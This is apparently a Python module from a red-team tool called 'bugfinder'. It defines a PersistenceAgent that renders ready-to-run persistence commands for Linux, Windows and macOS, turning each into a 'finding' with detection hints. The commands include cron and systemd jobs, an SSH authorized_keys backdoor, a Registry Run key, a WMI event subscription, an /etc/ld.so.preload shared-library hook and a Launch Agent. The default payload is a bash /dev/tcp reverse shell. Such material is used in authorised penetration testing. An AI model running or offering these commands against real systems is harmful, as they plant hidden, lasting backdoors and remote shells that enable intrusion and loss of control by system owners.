from __future__ import annotations

import logging

from bugfinder.agents.base import AgentContext, AgentResult, BaseAgent
from bugfinder.core.types import Confidence, Severity

logger = logging.getLogger(__name__)

PERSISTENCE_TECHNIQUES = [
    {
        "id": "cron_persistence",
        "title": "Cron Job Persistence (Linux)",
        "os": "linux",
        "description": "Creates a persistent cron job that executes a payload at regular intervals",
        "payload": '(crontab -l 2>/dev/null; echo "*/5 * * * * {PAYLOAD}") | crontab -',
        "detection": "Check /var/spool/cron/crontabs/ and /etc/cron* for unauthorized entries",
    },
    {
        "id": "systemd_service",
        "title": "Systemd Service Persistence (Linux)",
        "os": "linux",
        "description": "Creates a systemd service that starts on boot for persistence",
        "payload": """cat > /etc/systemd/system/bf-svc.service << 'EOF'
[Unit]
Description=BugFinder Persistence
After=network.target
[Service]
ExecStart={PAYLOAD}
Restart=always
RestartSec=60
[Install]
WantedBy=multi-user.target
EOF
systemctl enable bf-svc.service
systemctl start bf-svc.service""",
        "detection": "Check /etc/systemd/system/ for unauthorized service files",
    },
    {
        "id": "ssh_authorized_keys",
        "title": "SSH Authorized Key Backdoor",
        "os": "linux",
        "description": "Adds an SSH public key to authorized_keys for persistent access",
        "payload": 'echo "{PUBLIC_KEY}" >> ~/.ssh/authorized_keys && chmod 600 ~/.ssh/authorized_keys',
        "detection": "Review ~/.ssh/authorized_keys for unauthorized keys",
    },
    {
        "id": "registry_run",
        "title": "Registry Run Key (Windows)",
        "os": "windows",
        "description": "Adds a registry Run key to execute payload on user login",
        "payload": 'reg add "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run" /v BugFinderBackdoor /t REG_SZ /d "{PAYLOAD}" /f',
        "detection": "Check Registry Run keys and Startup folders for unauthorized entries",
    },
    {
        "id": "wmi_event_subscription",
        "title": "WMI Event Subscription (Windows)",
        "os": "windows",
        "description": "Creates a WMI event subscription for persistent payload execution",
        "payload": """powershell -Command "
$filter = ([wmiclass]'\\\\.\\root\\subscription:__EventFilter').CreateInstance();
$filter.QueryLanguage = 'WQL';
$filter.Query = 'SELECT * FROM __InstanceModificationEvent WITHIN 60 WHERE TargetInstance ISA 'Win32_PerfFormattedData_PerfOS_System'';
$filter.Name = 'BF-Persistence';
$filter.EventNamespace = 'root\\cimv2';
$filter.Put();
$consumer = ([wmiclass]'\\\\.\\root\\subscription:CommandLineEventConsumer').CreateInstance();
$consumer.Name = 'BF-Consumer';
$consumer.CommandLineTemplate = '{PAYLOAD}';
$consumer.Put();
$binding = ([wmiclass]'\\\\.\\root\\subscription:__FilterToConsumerBinding').CreateInstance();
$binding.Filter = $filter;
$binding.Consumer = $consumer;
$binding.Put();
" """,
        "detection": "Check WMI subscriptions with `Get-WmiObject -Namespace root/subscription -Class __EventFilter`",
    },
    {
        "id": "ld_preload",
        "title": "LD_PRELOAD Backdoor (Linux)",
        "os": "linux",
        "description": "Creates a shared library loaded by every process via LD_PRELOAD",
        "payload": """cat > /tmp/bf-hook.c << 'EOF'
#include <stdio.h>
#include <unistd.h>
#include <sys/socket.h>
#include <netinet/in.h>
__attribute__((constructor)) void bf_init() {
    if (fork() == 0) {
        {PAYLOAD_CODE}
    }
}
EOF
gcc -shared -fPIC -o /tmp/bf-hook.so /tmp/bf-hook.c -ldl
echo /tmp/bf-hook.so > /etc/ld.so.preload""",
        "detection": "Check /etc/ld.so.preload and LD_PRELOAD environment variable",
    },
    {
        "id": "launch_agent",
        "title": "Launch Agent (macOS)",
        "os": "macos",
        "description": "Creates a macOS Launch Agent for persistence",
        "payload": """cat > ~/Library/LaunchAgents/com.bf.plist << 'EOF'
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
    <key>Label</key>
    <string>com.bf</string>
    <key>ProgramArguments</key>
    <array><string>{PAYLOAD}</string></array>
    <key>RunAtLoad</key>
    <true/>
    <key>KeepAlive</key>
    <true/>
</dict>
</plist>
EOF
launchctl load ~/Library/LaunchAgents/com.bf.plist""",
        "detection": "Check ~/Library/LaunchAgents/ for unauthorized plist files",
    },
]


class PersistenceAgent(BaseAgent):
    name = "redteam.persistence"
    description = "Creates and detects persistence mechanisms across Linux, Windows, and macOS"
    category = "redteam"

    def __init__(self, context: AgentContext) -> None:
        super().__init__(context)

    async def execute(self) -> AgentResult:
        findings = []

        target = self.context.target
        os_type = self._detect_os()
        payload = self.context.config.get(
            "persistence_payload", "bash -c 'exec 5<>/dev/tcp/127.0.0.1/4444;cat<&5|while read l;do $l 2>&5>&5;done'"
        )
        public_key = self.context.config.get("ssh_public_key", "ssh-ed25519 AAAAC3...")

        for tech in PERSISTENCE_TECHNIQUES:
            if os_type != "unknown" and tech["os"] != os_type:
                continue

            rendered = tech["payload"].replace("{PAYLOAD}", payload).replace("{PUBLIC_KEY}", public_key)
            finding = {
                "id": f"persistence-{tech['id']}",
                "title": tech["title"],
                "description": tech["description"],
                "severity": Severity.CRITICAL.value,
                "confidence": Confidence.VERIFIED.value,
                "category": "redteam.persistence",
                "evidence": f"Persistence technique '{tech['id']}' generated for {target} ({os_type})",
                "remediation": tech["detection"],
                "payload_command": rendered,
                "os_type": tech["os"],
                "technique_id": tech["id"],
            }
            findings.append(finding)

        return AgentResult(
            agent_name=self.name,
            status="completed",
            findings=findings,
            summary=f"Generated {len(findings)} persistence mechanisms for {target}",
            data={"os_type": os_type, "techniques": len(findings)},
        )

    def _detect_os(self) -> str:
        target = self.context.target.lower()
        if any(x in target for x in [".exe", ".msi", ".dll", "windows", "winrm", "iis"]):
            return "windows"
        if any(x in target for x in ["linux", "ubuntu", "debian", "centos", "redhat", "ssh", "/bin/"]):
            return "linux"
        if any(x in target for x in ["macos", "osx", "darwin", ".app", "plist"]):
            return "macos"
        return "unknown"
